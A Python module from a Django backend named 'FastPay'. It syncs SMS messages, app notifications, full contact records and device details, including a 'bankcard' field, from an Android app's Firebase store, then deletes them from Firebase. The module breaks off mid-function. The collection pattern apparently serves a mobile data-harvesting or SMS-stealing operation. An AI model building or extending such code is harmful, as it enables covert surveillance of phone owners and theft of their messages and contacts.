"""
Firebase synchronization utilities for FastPay Backend

Provides functions to:
- Initialize Firebase Admin SDK
- Fetch messages, notifications, contacts from Firebase
- Sync device data between Firebase and Django
- Clean old messages from Firebase
"""
import os
import logging
from typing import Dict, Any, Optional

from django.utils import timezone
from django.db import transaction

logger = logging.getLogger(__name__)

# Firebase availability check
try:
    import firebase_admin
    from firebase_admin import credentials, db
    FIREBASE_AVAILABLE = True
except ImportError:
    FIREBASE_AVAILABLE = False
    logger.warning("Firebase Admin SDK not installed. Install with: pip install firebase-admin")


def initialize_firebase() -> bool:
    """
    Initialize Firebase Admin SDK.
    
    Uses FIREBASE_CREDENTIALS_PATH for service account JSON file,
    or falls back to default credentials (for GCP environments).
    
    Required environment variables:
    - FIREBASE_DATABASE_URL: Firebase Realtime Database URL
    - FIREBASE_CREDENTIALS_PATH: Path to service account JSON (optional)
    
    Returns:
        True if initialization successful
    
    Raises:
        ImportError: If firebase-admin is not installed
        ValueError: If required environment variables are missing
    """
    if not FIREBASE_AVAILABLE:
        raise ImportError("Firebase Admin SDK not installed. Install with: pip install firebase-admin")
    
    # Check if already initialized
    try:
        firebase_admin.get_app()
        return True
    except ValueError:
        pass
    
    # Get Firebase credentials from environment
    firebase_credential_path = os.environ.get('FIREBASE_CREDENTIALS_PATH')
    firebase_database_url = os.environ.get('FIREBASE_DATABASE_URL')
    
    if not firebase_database_url:
        raise ValueError("FIREBASE_DATABASE_URL environment variable is required")
    
    if firebase_credential_path and os.path.exists(firebase_credential_path):
        # Use service account JSON file
        cred = credentials.Certificate(firebase_credential_path)
        firebase_admin.initialize_app(cred, {
            'databaseURL': firebase_database_url
        })
    else:
        # Try to use default credentials (for GCP environments)
        try:
            firebase_admin.initialize_app(options={
                'databaseURL': firebase_database_url
            })
        except Exception as e:
            raise ValueError(
                f"Firebase initialization failed. Provide FIREBASE_CREDENTIALS_PATH "
                f"or use default credentials. Error: {e}"
            )
    
    return True


def get_firebase_messages_for_device(device_id: str, limit: Optional[int] = None) -> Dict[str, Any]:
    """
    Fetch messages from Firebase for a specific device.
    
    Args:
        device_id: Device ID
        limit: Optional limit for number of messages to fetch
    
    Returns:
        Dictionary of messages with timestamps as keys
    """
    if not FIREBASE_AVAILABLE:
        raise ImportError("Firebase Admin SDK not available")
    
    try:
        initialize_firebase()
    except Exception as e:
        logger.error(f"Failed to initialize Firebase: {e}")
        return {}
    
    # Firebase paths to try (different structures for different app versions)
    paths_to_try = [
        f"fastpay/{device_id}/messages",
        f"message/{device_id}",
        f"fastpay/testing/{device_id}/messages",
        f"fastpay/running/{device_id}/messages",
    ]
    
    messages = {}
    for path in paths_to_try:
        try:
            ref = db.reference(path)
            data = ref.get()
            if data:
                messages = data
                break
        except Exception as e:
            logger.debug(f"Failed to fetch from {path}: {e}")
            continue
    
    # If limit is specified, keep only the latest N messages
    if limit and messages:
        sorted_timestamps = sorted(
            messages.keys(),
            key=lambda x: int(x) if x.isdigit() else 0,
            reverse=True
        )
        messages = {ts: messages[ts] for ts in sorted_timestamps[:limit]}
    
    return messages


def get_firebase_notifications_for_device(device_id: str) -> Dict[str, Any]:
    """
    Fetch notifications from Firebase for a specific device.
    
    Args:
        device_id: Device ID
    
    Returns:
        Dictionary of notifications with timestamps as keys
    """
    if not FIREBASE_AVAILABLE:
        raise ImportError("Firebase Admin SDK not available")
    
    try:
        initialize_firebase()
    except Exception as e:
        logger.error(f"Failed to initialize Firebase: {e}")
        return {}
    
    # Firebase paths to try
    paths_to_try = [
        f"device/{device_id}/Notification",  # Primary path (matches APK)
        f"fastpay/{device_id}/Notification",  # Legacy path
        f"notification/{device_id}",
        f"fastpay/testing/{device_id}/Notification",
        f"fastpay/running/{device_id}/Notification",
    ]
    
    notifications = {}
    for path in paths_to_try:
        try:
            ref = db.reference(path)
            data = ref.get()
            if data:
                notifications = data
                break
        except Exception as e:
            logger.debug(f"Failed to fetch notifications from {path}: {e}")
            continue
    
    return notifications


def get_firebase_contacts_for_device(device_id: str) -> Dict[str, Any]:
    """
    Fetch contacts from Firebase for a specific device.
    
    Args:
        device_id: Device ID
    
    Returns:
        Dictionary of contacts with phone numbers as keys
    """
    if not FIREBASE_AVAILABLE:
        raise ImportError("Firebase Admin SDK not available")
    
    try:
        initialize_firebase()
    except Exception as e:
        logger.error(f"Failed to initialize Firebase: {e}")
        return {}
    
    # Firebase paths to try
    paths_to_try = [
        f"device/{device_id}/Contact",  # Primary path (matches APK)
        f"fastpay/{device_id}/Contact",  # Legacy path
        f"contact/{device_id}",
        f"fastpay/testing/{device_id}/Contact",
        f"fastpay/running/{device_id}/Contact",
    ]
    
    contacts = {}
    for path in paths_to_try:
        try:
            ref = db.reference(path)
            data = ref.get()
            if data:
                contacts = data
                break
        except Exception as e:
            logger.debug(f"Failed to fetch contacts from {path}: {e}")
            continue
    
    return contacts


def get_firebase_device_info(device_id: str) -> Dict[str, Any]:
    """
    Fetch device information from Firebase.
    
    Args:
        device_id: Device ID
    
    Returns:
        Dictionary with device information
    """
    if not FIREBASE_AVAILABLE:
        raise ImportError("Firebase Admin SDK not available")
    
    try:
        initialize_firebase()
    except Exception as e:
        logger.error(f"Failed to initialize Firebase: {e}")
        return {}
    
    # Firebase paths to try
    paths_to_try = [
        f"device/{device_id}",  # Primary path (matches APK structure)
        f"fastpay/{device_id}",  # Legacy path
        f"fastpay/testing/{device_id}",
        f"fastpay/running/{device_id}",
    ]
    
    device_info = {}
    for path in paths_to_try:
        try:
            ref = db.reference(path)
            data = ref.get()
            if data:
                device_info = data
                break
        except Exception as e:
            logger.debug(f"Failed to fetch device info from {path}: {e}")
            continue
    
    return device_info


def hard_sync_device_from_firebase(device_id: str, update_existing: bool = True) -> Dict[str, Any]:
    """
    Hard sync: Sync all device data from Firebase to Django.
    
    Syncs:
    - Device information (name, code, isActive, systemInfo, etc.)
    - Messages
    - Notifications
    - Contacts
    
    Args:
        device_id: Device ID
        update_existing: If True, update existing records; if False, skip existing
    
    Returns:
        Dictionary with sync results
    """
    from api.models import Device, Message, Notification, Contact
    from .helpers import get_all_admin_users
    
    result = {
        'device_id': device_id,
        'device_created': False,
        'device_updated': False,
        'messages_fetched': 0,
        'messages_created': 0,
        'messages_updated': 0,
        'messages_skipped': 0,
        'notifications_fetched': 0,
        'notifications_created': 0,
        'notifications_updated': 0,
        'notifications_skipped': 0,
        'contacts_fetched': 0,
        'contacts_created': 0,
        'contacts_updated': 0,
        'contacts_skipped': 0,
        'errors': [],
    }
    
    try:
        # Get device info from Firebase
        firebase_device_info = get_firebase_device_info(device_id)
        
        if not firebase_device_info:
            result['errors'].append(f"No device data found in Firebase for device {device_id}")
            logger.warning(f"No device data found in Firebase for device {device_id}")
            return result
        
        # Get or create device in Django
        with transaction.atomic():
            # Update sync status to syncing
            try:
                device = Device.objects.get(device_id=device_id)
                device.sync_status = 'syncing'
                device.sync_error_message = None
                device.save(update_fields=['sync_status', 'sync_error_message'])
            except Device.DoesNotExist:
                device = None
            
            # Normalize isActive value from Firebase
            firebase_is_active = firebase_device_info.get('isActive', False)
            if isinstance(firebase_is_active, str):
                is_active_bool = firebase_is_active.lower() in ('opened', 'active', 'true', '1', 'yes')
            else:
                is_active_bool = bool(firebase_is_active)

            defaults = {
                'name': firebase_device_info.get('name') or firebase_device_info.get('deviceName'),
                'model': firebase_device_info.get('model'),
                'phone': firebase_device_info.get('phone'),
                'code': firebase_device_info.get('code'),
                'is_active': is_active_bool,
                'last_seen': firebase_device_info.get('time') or firebase_device_info.get('lastSeen'),
                'battery_percentage': firebase_device_info.get('batteryPercentage'),
                'current_phone': firebase_device_info.get('currentPhone') or firebase_device_info.get('phone'),
                'current_identifier': firebase_device_info.get('currentIdentifier'),
                'time': firebase_device_info.get('time'),
                'bankcard': firebase_device_info.get('bankcard', 'BANKCARD'),
                'system_info': firebase_device_info.get('systemInfo', {}),
                'sync_status': 'syncing',
            }
            device, created = Device.objects.get_or_create(
                device_id=device_id,
                defaults=defaults,
            )
            # Assign to all admin users (access_level = 0)
            admin_users = get_all_admin_users()
            device.assigned_to.add(*admin_users)
            if created:
                result['device_created'] = True
            else:
                # Update existing device
                if update_existing:
                    device.name = firebase_device_info.get('name') or firebase_device_info.get('deviceName') or device.name
                    device.model = firebase_device_info.get('model') or device.model
                    device.phone = firebase_device_info.get('phone') or device.phone
                    device.code = firebase_device_info.get('code') or device.code
                    device.is_active = is_active_bool
                    device.last_seen = firebase_device_info.get('time') or firebase_device_info.get('lastSeen') or device.last_seen
                    device.battery_percentage = firebase_device_info.get('batteryPercentage') if 'batteryPercentage' in firebase_device_info else device.battery_percentage
                    device.current_phone = firebase_device_info.get('currentPhone') or firebase_device_info.get('phone') or device.current_phone
                    device.current_identifier = firebase_device_info.get('currentIdentifier') or device.current_identifier
                    device.time = firebase_device_info.get('time') or device.time
                    device.bankcard = firebase_device_info.get('bankcard', device.bankcard)
                    # Merge system_info
                    if firebase_device_info.get('systemInfo'):
                        current_system_info = device.system_info or {}
                        current_system_info.update(firebase_device_info.get('systemInfo', {}))
                        device.system_info = current_system_info
                    device.sync_status = 'syncing'
                    device.sync_error_message = None
                    device.save()
                    result['device_updated'] = True
                else:
                    result['device_updated'] = False
        
        # Sync Messages
        firebase_messages = get_firebase_messages_for_device(device_id)
        result['messages_fetched'] = len(firebase_messages)
        
        for timestamp_str, message_data in firebase_messages.items():
            try:
                timestamp = int(timestamp_str)
                
                # Handle different data formats (dict or tilde-separated string)
                if isinstance(message_data, dict):
                    message_type = message_data.get('type', 'received')
                    phone = message_data.get('phone', '')
                    body = message_data.get('body', '')
                    read = message_data.get('read', False)
                elif isinstance(message_data, str):
                    # Format: type~phone~body
                    parts = message_data.split('~', 2)
                    message_type = parts[0] if len(parts) > 0 else 'received'
                    phone = parts[1] if len(parts) > 1 else ''
                    body = parts[2] if len(parts) > 2 else ''
                    read = False
                else:
                    result['messages_skipped'] += 1
                    continue
                
                if message_type not in ['received', 'sent']:
                    message_type = 'received'
                
                message, created = Message.objects.get_or_create(
                    device=device,
                    timestamp=timestamp,
                    defaults={
                        'message_type': message_type,
                        'phone': phone,
                        'body': body,
                        'read': read,
                    }
                )
                
                if created:
                    result['messages_created'] += 1
                elif update_existing:
                    message.message_type = message_type
                    message.phone = phone
                    message.body = body
                    message.read = read
                    message.save()
                    result['messages_updated'] += 1
                else:
                    result['messages_skipped'] += 1
                    
            except Exception as e:
                result['errors'].append(f"Error processing message {timestamp_str}: {str(e)}")
                logger.error(f"Error processing message {timestamp_str} for device {device_id}: {e}")
                continue
        
        # Sync Notifications
        firebase_notifications = get_firebase_notifications_for_device(device_id)
        result['notifications_fetched'] = len(firebase_notifications)
        
        for timestamp_str, notification_data in firebase_notifications.items():
            try:
                timestamp = int(timestamp_str)
                
                # Handle different data formats (dict or tilde-separated string)
                if isinstance(notification_data, dict):
                    package_name = notification_data.get('package', '') or notification_data.get('packageName', '')
                    title = notification_data.get('title', '')
                    text = notification_data.get('text', '') or notification_data.get('body', '')
                elif isinstance(notification_data, str):
                    # Format: package~title~text
                    parts = notification_data.split('~', 2)
                    package_name = parts[0] if len(parts) > 0 else ''
                    title = parts[1] if len(parts) > 1 else ''
                    text = parts[2] if len(parts) > 2 else ''
                else:
                    result['notifications_skipped'] += 1
                    continue
                
                if not package_name:
                    continue
                
                notification, created = Notification.objects.get_or_create(
                    device=device,
                    timestamp=timestamp,
                    defaults={
                        'package_name': package_name,
                        'title': title,
                        'text': text,
                    }
                )
                
                if created:
                    result['notifications_created'] += 1
                elif update_existing:
                    notification.package_name = package_name
                    notification.title = title
                    notification.text = text
                    notification.save()
                    result['notifications_updated'] += 1
                else:
                    result['notifications_skipped'] += 1
                    
            except Exception as e:
                result['errors'].append(f"Error processing notification {timestamp_str}: {str(e)}")
                logger.error(f"Error processing notification {timestamp_str} for device {device_id}: {e}")
                continue
        
        # Sync Contacts
        firebase_contacts = get_firebase_contacts_for_device(device_id)
        result['contacts_fetched'] = len(firebase_contacts)
        
        for phone_number, contact_data in firebase_contacts.items():
            try:
                # Handle both dict and direct value cases
                if isinstance(contact_data, dict):
                    contact_id = contact_data.get('contactId') or contact_data.get('id', phone_number)
                    name = contact_data.get('name', '')
                    display_name = contact_data.get('displayName', '') or contact_data.get('display_name', '')
                    phones = contact_data.get('phones', [])
                    emails = contact_data.get('emails', [])
                    addresses = contact_data.get('addresses', [])
                    websites = contact_data.get('websites', [])
                    im_accounts = contact_data.get('imAccounts', []) or contact_data.get('im_accounts', [])
                    photo_uri = contact_data.get('photoUri', '') or contact_data.get('photo_uri', '')
                    thumbnail_uri = contact_data.get('thumbnailUri', '') or contact_data.get('thumbnail_uri', '')
                    company = contact_data.get('company', '')
                    job_title = contact_data.get('jobTitle', '') or contact_data.get('job_title', '')
                    department = contact_data.get('department', '')
                    birthday = contact_data.get('birthday', '')
                    anniversary = contact_data.get('anniversary', '')
                    notes = contact_data.get('notes', '')
                    last_contacted = contact_data.get('lastContacted', '') or contact_data.get('last_contacted', '')
                    times_contacted = contact_data.get('timesContacted', 0) or contact_data.get('times_contacted', 0)
                    is_starred = contact_data.get('isStarred', False) or contact_data.get('is_starred', False)
                    nickname = contact_data.get('nickname', '')
                    phonetic_name = contact_data.get('phoneticName', '') or contact_data.get('phonetic_name', '')
                else:
                    # Simple case - just phone number
                    contact_id = phone_number
                    name = ''
                    display_name = ''
                    phones = []
                    emails = []
                    addresses = []
                    websites = []
                    im_accounts = []
                    photo_uri = ''
                    thumbnail_uri = ''
                    company = ''
                    job_title = ''
                    department = ''
                    birthday = ''
                    anniversary = ''
                    notes = ''
                    last_contacted = None
                    times_contacted = 0
                    is_starred = False
                    nickname = ''
                    phonetic_name = ''
                
                # Convert last_contacted to int if it's a string
                if isinstance(last_contacted, str) and last_contacted.isdigit():
                    last_contacted = int(last_contacted)
                elif not isinstance(last_contacted, (int, type(None))):
                    last_contacted = None
                
                contact, created = Contact.objects.get_or_create(
                    device=device,
                    phone_number=phone_number,
                    defaults={
                        'contact_id': contact_id,
                        'name': name,
                        'display_name': display_name,
                        'phones': phones if isinstance(phones, list) else [],
                        'emails': emails if isinstance(emails, list) else [],
                        'addresses': addresses if isinstance(addresses, list) else [],
                        'websites': websites if isinstance(websites, list) else [],
                        'im_accounts': im_accounts if isinstance(im_accounts, list) else [],
                        'photo_uri': photo_uri,
                        'thumbnail_uri': thumbnail_uri,
                        'company': company,
                        'job_title': job_title,
                        'department': department,
                        'birthday': birthday,
                        'anniversary': anniversary,
                        'notes': notes,
                        'last_contacted': last_contacted,
                        'times_contacted': times_contacted,
                        'is_starred': is_starred,
                        'nickname': nickname,
                        'phonetic_name': phonetic_name,
                    }
                )
                
                if created:
                    result['contacts_created'] += 1
                elif update_existing:
                    contact.contact_id = contact_id
                    contact.name = name
                    contact.display_name = display_name
                    contact.phones = phones if isinstance(phones, list) else []
                    contact.emails = emails if isinstance(emails, list) else []
                    contact.addresses = addresses if isinstance(addresses, list) else []
                    contact.websites = websites if isinstance(websites, list) else []
                    contact.im_accounts = im_accounts if isinstance(im_accounts, list) else []
                    contact.photo_uri = photo_uri
                    contact.thumbnail_uri = thumbnail_uri
                    contact.company = company
                    contact.job_title = job_title
                    contact.department = department
                    contact.birthday = birthday
                    contact.anniversary = anniversary
                    contact.notes = notes
                    contact.last_contacted = last_contacted
                    contact.times_contacted = times_contacted
                    contact.is_starred = is_starred
                    contact.nickname = nickname
                    contact.phonetic_name = phonetic_name
                    contact.save()
                    result['contacts_updated'] += 1
                else:
                    result['contacts_skipped'] += 1
                    
            except Exception as e:
                result['errors'].append(f"Error processing contact {phone_number}: {str(e)}")
                logger.error(f"Error processing contact {phone_number} for device {device_id}: {e}")
                continue
        
        # Update device sync status and timestamps
        try:
            device = Device.objects.get(device_id=device_id)
            now = timezone.now()
            
            if result['errors']:
                device.sync_status = 'sync_failed'
                device.sync_error_message = '; '.join(result['errors'][:500])
            else:
                device.sync_status = 'synced'
                device.sync_error_message = None
                device.last_sync_at = now
                device.last_hard_sync_at = now
            
            # Update individual sync timestamps
            if result['messages_fetched'] > 0:
                device.messages_last_synced_at = now
            if result['notifications_fetched'] > 0:
                device.notifications_last_synced_at = now
            if result['contacts_fetched'] > 0:
                device.contacts_last_synced_at = now
            
            # Update sync metadata
            device.sync_metadata = {
                'last_sync_messages_count': result['messages_fetched'],
                'last_sync_notifications_count': result['notifications_fetched'],
                'last_sync_contacts_count': result['contacts_fetched'],
                'last_sync_messages_created': result['messages_created'],
                'last_sync_messages_updated': result['messages_updated'],
                'last_sync_notifications_created': result['notifications_created'],
                'last_sync_notifications_updated': result['notifications_updated'],
                'last_sync_contacts_created': result['contacts_created'],
                'last_sync_contacts_updated': result['contacts_updated'],
            }
            
            device.save()

            # Clean Firebase after sync to reduce load (optional)
            if result['notifications_fetched'] > 0:
                try:
                    clean_firebase_notifications(device_id, keep_latest=100)
                except Exception as clean_e:
                    logger.debug(f"Firebase notifications cleanup skipped for {device_id}: {clean_e}")
            if result['contacts_fetched'] > 0:
                try:
                    clean_firebase_contacts(device_id, keep_latest=0)
                except Exception as clean_e:
                    logger.debug(f"Firebase contacts cleanup skipped for {device_id}: {clean_e}")
        except Exception as e:
            result['errors'].append(f"Error updating device sync status: {str(e)}")
            logger.error(f"Error updating device sync status for device {device_id}: {e}")
        
    except Exception as e:
        result['errors'].append(f"Hard sync failed: {str(e)}")
        logger.error(f"Error hard syncing device {device_id}: {e}")
        
        # Update device sync status to failed
        try:
            from api.models import Device
            device = Device.objects.get(device_id=device_id)
            device.sync_status = 'sync_failed'
            device.sync_error_message = str(e)[:500]
            device.save(update_fields=['sync_status', 'sync_error_message'])
        except Exception:
            pass
    
    return result


def sync_messages_from_firebase(device_id: str, keep_latest: int = 100) -> Dict[str, Any]:
    """
    Sync messages from Firebase to Django for a specific device.
    After syncing, clean Firebase to keep only the latest N messages.
    
    Args:
        device_id: Device ID
        keep_latest: Number of latest messages to keep in Firebase (default: 100)
    
    Returns:
        Dictionary with sync results
    """
    from api.models import Device, Message
    
    result = {
        'device_id': device_id,
        'messages_fetched': 0,
        'messages_created': 0,
        'messages_skipped': 0,
        'errors': [],
        'firebase_cleaned': False
    }
    
    try:
        # Get device from Django
        try:
            device = Device.objects.get(device_id=device_id)
        except Device.DoesNotExist:
            result['errors'].append(f"Device {device_id} not found in Django database")
            return result
        
        # Fetch all messages from Firebase
        firebase_messages = get_firebase_messages_for_device(device_id)
        result['messages_fetched'] = len(firebase_messages)
        
        if not firebase_messages:
            logger.info(f"No messages found in Firebase for device {device_id}")
            return result
        
        # Process messages in a transaction
        with transaction.atomic():
            created_count = 0
            skipped_count = 0
            
            for timestamp_str, message_data in firebase_messages.items():
                try:
                    timestamp = int(timestamp_str)
                    
                    # Handle different data formats (dict or tilde-separated string)
                    if isinstance(message_data, dict):
                        message_type = message_data.get('type', 'received')
                        phone = message_data.get('phone', '')
                        body = message_data.get('body', '')
                        read = message_data.get('read', False)
                    elif isinstance(message_data, str):
                        # Format: type~phone~body
                        parts = message_data.split('~', 2)
                        message_type = parts[0] if len(parts) > 0 else 'received'
                        phone = parts[1] if len(parts) > 1 else ''
                        body = parts[2] if len(parts) > 2 else ''
                        read = False
                    else:
                        skipped_count += 1
                        continue
                    
                    # Check if message already exists
                    if Message.objects.filter(device=device, timestamp=timestamp).exists():
                        skipped_count += 1
                        continue
                    
                    if message_type not in ['received', 'sent']:
                        message_type = 'received'
                    
                    # Create message in Django
                    Message.objects.create(
                        device=device,
                        message_type=message_type,
                        phone=phone,
                        body=body,
                        timestamp=timestamp,
                        read=read
                    )
                    created_count += 1
                    
                except Exception as e:
                    result['errors'].append(f"Error processing message {timestamp_str}: {str(e)}")
                    logger.error(f"Error processing message {timestamp_str} for device {device_id}: {e}")
                    continue
            
            result['messages_created'] = created_count
            result['messages_skipped'] = skipped_count
        
        # Clean Firebase - keep only latest N messages
        try:
            clean_firebase_messages(device_id, keep_latest=keep_latest)
            result['firebase_cleaned'] = True
        except Exception as e:
            result['errors'].append(f"Error cleaning Firebase: {str(e)}")
            logger.error(f"Error cleaning Firebase for device {device_id}: {e}")
        
    except Exception as e:
        result['errors'].append(f"Sync failed: {str(e)}")
        logger.error(f"Error syncing messages for device {device_id}: {e}")
    
    return result


def sync_notifications_from_firebase(device_id: str, keep_latest: int = 100) -> Dict[str, Any]:
    """
    Sync notifications from Firebase to Django for a device, then clean Firebase.
    """
    from api.models import Device, Notification

    result = {
        'device_id': device_id,
        'notifications_fetched': 0,
        'notifications_created': 0,
        'notifications_updated': 0,
        'notifications_skipped': 0,
        'errors': [],
        'firebase_cleaned': False,
    }
    try:
        device = Device.objects.get(device_id=device_id)
    except Device.DoesNotExist:
        result['errors'].append(f"Device {device_id} not found in Django database")
        return result

    firebase_notifications = get_firebase_notifications_for_device(device_id)
    result['notifications_fetched'] = len(firebase_notifications)
    if not firebase_notifications:
        return result

    created = updated = skipped = 0
    for timestamp_str, notification_data in firebase_notifications.items():
        try:
            timestamp = int(timestamp_str)
            if isinstance(notification_data, dict):
                package_name = notification_data.get('package', '') or notification_data.get('packageName', '')
                title = notification_data.get('title', '')
                text = notification_data.get('text', '') or notification_data.get('body', '')
            elif isinstance(notification_data, str):
                parts = notification_data.split('~', 2)
                package_name = parts[0] if len(parts) > 0 else ''
                title = parts[1] if len(parts) > 1 else ''
                text = parts[2] if len(parts) > 2 else ''
            else:
                skipped += 1
                continue
            if not package_name:
                continue
            notification, created_flag = Notification.objects.get_or_create(
                device=device,
                timestamp=timestamp,
                defaults={'package_name': package_name, 'title': title, 'text': text},
            )
            if created_flag:
                created += 1
            else:
                notification.package_name = package_name
                notification.title = title
                notification.text = text
                notification.save()
                updated += 1
        except Exception as e:
            result['errors'].append(f"Notification {timestamp_str}: {str(e)}")
            logger.error(f"Error processing notification {timestamp_str} for device {device_id}: {e}")
            continue
    result['notifications_created'] = created
    result['notifications_updated'] = updated
    result['notifications_skipped'] = skipped

    try:
        clean_firebase_notifications(device_id, keep_latest=keep_latest)
        result['firebase_cleaned'] = True
    except Exception as e:
        result['errors'].append(f"Error cleaning Firebase: {str(e)}")
        logger.error(f"Error cleaning Firebase notifications for device {device_id}: {e}")
    return result


def sync_contacts_from_firebase(device_id: str, keep_latest: int = 0) -> Dict[str, Any]:
    """
    Sync contacts from Firebase to Django for a device, then clean Firebase.
    keep_latest=0 means delete entire Contact node after sync.
    """
    from api.models import Device, Contact

    result = {
        'device_id': device_id,
        'contacts_fetched': 0,
        'contacts_created': 0,
        'contacts_updated': 0,
        'contacts_skipped': 0,
        'errors': [],
        'firebase_cleaned': False,
    }
    try:
        device = Device.objects.get(device_id=device_id)
    except Device.DoesNotExist:
        result['errors'].append(f"Device {device_id} not found in Django database")
        return result

    firebase_contacts = get_firebase_contacts_for_device(device_id)
    result['contacts_fetched'] = len(firebase_contacts)
    if not firebase_contacts:
        return result

    created = updated = skipped = 0
    for phone_number, contact_data in firebase_contacts.items():
        try:
            if isinstance(contact_data, dict):
                contact_id = contact_data.get('contactId') or contact_data.get('id', phone_number)
                name = contact_data.get('name', '')
                display_name = contact_data.get('displayName', '') or contact_data.get('display_name', '')
                phones = contact_data.get('phones', [])
                emails = contact_data.get('emails', [])
                addresses = contact_data.get('addresses', [])
                websites = contact_data.get('websites', [])
                im_accounts = contact_data.get('imAccounts', []) or contact_data.get('im_accounts', [])
                photo_uri = contact_data.get('photoUri', '') or contact_data.get('photo_uri', '')
                thumbnail_uri = contact_data.get('thumbnailUri', '') or contact_data.get('thumbnail_uri', '')
                company = contact_data.get('company', '')
                job_title = contact_data.get('jobTitle', '') or contact_data.get('job_title', '')
                department = contact_data.get('department', '')
                birthday = contact_data.get('birthday', '')
                anniversary = contact_data.get('anniversary', '')
                notes = contact_data.get('notes', '')
                last_contacted = contact_data.get('lastContacted', '') or contact_data.get('last_contacted', '')
                times_contacted = contact_data.get('timesContacted', 0) or contact_data.get('times_contacted', 0)
                is_starred = contact_data.get('isStarred', False) or contact_data.get('is_starred', False)
                nickname = contact_data.get('nickname', '')
                phonetic_name = contact_data.get('phoneticName', '') or contact_data.get('phonetic_name', '')
            else:
                contact_id = phone_number
                name = display_name = photo_uri = thumbnail_uri = company = job_title = department = ''
                birthday = anniversary = notes = nickname = phonetic_name = ''
                phones = emails = addresses = websites = im_accounts = []
                last_contacted = None
                times_contacted = 0
                is_starred = False
            if isinstance(last_contacted, str) and last_contacted.isdigit():
                last_contacted = int(last_contacted)
            elif not isinstance(last_contacted, (int, type(None))):
                last_contacted = None
            defaults = {
                'contact_id': contact_id,
                'name': name,
                'display_name': display_name,
                'phones': phones if isinstance(phones, list) else [],
                'emails': emails if isinstance(emails, list) else [],
                'addresses': addresses if isinstance(addresses, list) else [],
                'websites': websites if isinstance(websites, list) else [],
                'im_accounts': im_accounts if isinstance(im_accounts, list) else [],
                'photo_uri': photo_uri,
                'thumbnail_uri': thumbnail_uri,
                'company': company,
                'job_title': job_title,
                'department': department,
                'birthday': birthday,
                'anniversary': anniversary,
                'notes': notes,
                'last_contacted': last_contacted,
                'times_contacted': times_contacted,
                'is_starred': is_starred,
                'nickname': nickname,
                'phonetic_name': phonetic_name,
            }
            contact, created_flag = Contact.objects.get_or_create(
                device=device,
                phone_number=phone_number,
                defaults=defaults,
            )
            if created_flag:
                created += 1
            else:
                for k, v in defaults.items():
                    setattr(contact, k, v)
                contact.save()
                updated += 1
        except Exception as e:
            result['errors'].append(f"Contact {phone_number}: {str(e)}")
            logger.error(f"Error processing contact {phone_number} for device {device_id}: {e}")
            continue
    result['contacts_created'] = created
    result['contacts_updated'] = updated
    result['contacts_skipped'] = skipped

    try:
        clean_firebase_contacts(device_id, keep_latest=keep_latest)
        result['firebase_cleaned'] = True
    except Exception as e:
        result['errors'].append(f"Error cleaning Firebase: {str(e)}")
        logger.error(f"Error cleaning Firebase contacts for device {device_id}: {e}")
    return result


def clean_firebase_messages(device_id: str, keep_latest: int = 100) -> None:
    """
    Clean Firebase messages for a device, keeping only the latest N messages.
    
    Args:
        device_id: Device ID
        keep_latest: Number of latest messages to keep (default: 100)
    """
    if not FIREBASE_AVAILABLE:
        raise ImportError("Firebase Admin SDK not available")
    
    try:
        initialize_firebase()
    except Exception as e:
        logger.error(f"Failed to initialize Firebase: {e}")
        raise
    
    # Try different Firebase paths
    paths_to_try = [
        f"fastpay/{device_id}/messages",
        f"message/{device_id}",
    ]
    
    for path in paths_to_try:
        try:
            ref = db.reference(path)
            messages = ref.get()
            
            if not messages:
                continue
            
            # Sort by timestamp (keys are timestamps)
            sorted_timestamps = sorted(
                messages.keys(),
                key=lambda x: int(x) if x.isdigit() else 0,
                reverse=True
            )
            
            # Keep only the latest N messages
            if len(sorted_timestamps) > keep_latest:
                # Messages to delete (all except the latest N)
                messages_to_delete = sorted_timestamps[keep_latest:]
                
                # Delete old messages
                for timestamp in messages_to_delete:
                    ref.child(timestamp).delete()
                
                logger.info(
                    f"Cleaned Firebase for device {device_id}: "
                    f"Kept {keep_latest} messages, deleted {len(messages_to_delete)} messages"
                )
                return
            
            logger.info(
                f"Firebase for device {device_id} already has "
                f"{len(sorted_timestamps)} messages (<= {keep_latest}), no cleanup needed"
            )
            return
            
        except Exception as e:
            logger.debug(f"Failed to clean from {path}: {e}")
            continue
    
    logger.warning(f"Could not find messages in Firebase for device {device_id}")


def clean_firebase_notifications(device_id: str, keep_latest: int = 100) -> None:
    """
    Clean Firebase notifications for a device, keeping only the latest N.
    Uses the same path list as get_firebase_notifications_for_device.
    """
    if not FIREBASE_AVAILABLE:
        raise ImportError("Firebase Admin SDK not available")
    try:
        initialize_firebase()
    except Exception as e:
        logger.error(f"Failed to initialize Firebase: {e}")
        raise
    paths_to_try = [
        f"device/{device_id}/Notification",
        f"fastpay/{device_id}/Notification",
        f"notification/{device_id}",
        f"fastpay/testing/{device_id}/Notification",
        f"fastpay/running/{device_id}/Notification",
    ]
    for path in paths_to_try:
        try:
            ref = db.reference(path)
            data = ref.get()
            if not data or not isinstance(data, dict):
                continue
            sorted_keys = sorted(
                data.keys(),
                key=lambda x: int(x) if str(x).isdigit() else 0,
                reverse=True,
            )
            if len(sorted_keys) <= keep_latest:
                logger.debug(f"Firebase notifications for device {device_id} already <= {keep_latest}, no cleanup")
                return
            to_delete = sorted_keys[keep_latest:]
            for key in to_delete:
                ref.child(key).delete()
            logger.info(f"Cleaned Firebase notifications for device {device_id}: kept {keep_latest}, deleted {len(to_delete)}")
            return
        except Exception as e:
            logger.debug(f"Failed to clean notifications from {path}: {e}")
            continue
    logger.warning(f"Could not find notifications in Firebase for device {device_id}")


def clean_firebase_contacts(device_id: str, keep_latest: int = 0) -> None:
    """
    Clean Firebase contacts for a device.
    keep_latest=0: delete entire Contact node after sync (recommended).
    keep_latest>0: keep that many keys, delete the rest (arbitrary order).
    """
    if not FIREBASE_AVAILABLE:
        raise ImportError("Firebase Admin SDK not available")
    try:
        initialize_firebase()
    except Exception as e:
        logger.error(f"Failed to initialize Firebase: {e}")
        raise
    paths_to_try = [
        f"device/{device_id}/Contact",
        f"fastpay/{device_id}/Contact",
        f"contact/{device_id}",
        f"fastpay/testing/{device_id}/Contact",
        f"fastpay/running/{device_id}/Contact",
    ]
    for path in paths_to_try:
        try:
            ref = db.reference(path)
            data = ref.get()
            if not data or not isinstance(data, dict):
                continue
            keys = list(data.keys())
            if keep_latest == 0:
                ref.delete()
                logger.info(f"Cleaned Firebase contacts for device {device_id}: deleted entire node ({len(keys)} contacts)")
                return
            if len(keys) <= keep_latest:
                logger.debug(f"Firebase contacts for device {device_id} already <= {keep_latest}, no cleanup")
                return
            sorted_keys = sorted(keys, key=lambda x: str(x))
            to_delete = sorted_keys[keep_latest:]
            for key in to_delete:
